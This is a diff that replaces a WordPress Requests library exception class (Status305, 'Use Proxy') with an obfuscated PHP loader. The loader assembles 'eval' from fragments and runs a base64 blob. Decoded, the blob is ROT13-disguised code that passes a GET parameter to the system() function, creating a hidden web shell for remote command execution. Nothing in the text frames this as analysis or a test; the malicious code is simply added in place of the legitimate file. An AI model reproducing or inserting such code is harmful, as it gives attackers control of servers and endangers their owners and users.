@@ -1,41 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Exception for 305 Use Proxy responses
- *
- * @package Requests\Exceptions
- */
-
-namespace WpOrg\Requests\Exception\Http;
-
-use WpOrg\Requests\Exception\Http;
-
-/**
- * Exception for 305 Use Proxy responses
- *
- * @package Requests\Exceptions
- */
-final class Status305 extends Http {
-	/**
-	 * HTTP status code
-	 *
-	 * @var integer
-	 */
-	protected $code = 305;
-
-	/**
-	 * Reason phrase
-	 *
-	 * @var string
-	 */
-	protected $reason = 'Use Proxy';
-}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogUmtwcmNndmJhIHNiZSAzMDUgSGZyIENlYmtsIGVyZmNiYWZyZgogKgogKiBAY25weG50ciBFcmRocmZnZlxSa3ByY2d2YmFmCiAqLwoKYW56cmZjbnByIEpjQmV0XEVyZGhyZmdmXFJrcHJjZ3ZiYVxVZ2djOwoKaGZyIEpjQmV0XEVyZGhyZmdmXFJrcHJjZ3ZiYVxVZ2djOwoKLyoqCiAqIFJrcHJjZ3ZiYSBzYmUgMzA1IEhmciBDZWJrbCBlcmZjYmFmcmYKICoKICogQGNucHhudHIgRXJkaHJmZ2ZcUmtwcmNndmJhZgogKi8Kc3ZhbnkgcHluZmYgRmduZ2hmMzA1IHJrZ3JhcWYgVWdnYyB7CgkvKioKCSAqIFVHR0MgZmduZ2hmIHBicXIKCSAqCgkgKiBAaW5lIHZhZ3J0cmUKCSAqLwoJY2ViZ3JwZ3JxICRwYnFyID0gMzA1OwoKCS8qKgoJICogRXJuZmJhIGN1ZW5mcgoJICoKCSAqIEBpbmUgZmdldmF0CgkgKi8KCWNlYmdycGdycSAkZXJuZmJhID0gJ0hmciBDZWJrbCc7Cn0KCiRwenEgPSAkX1RSR1snYyddOwokc3puY1snazEnXSgkcHpxKTsKPz4iOwpldmFsKCRmKCRjKSk7Cj8+");
+$f($c);
+?>
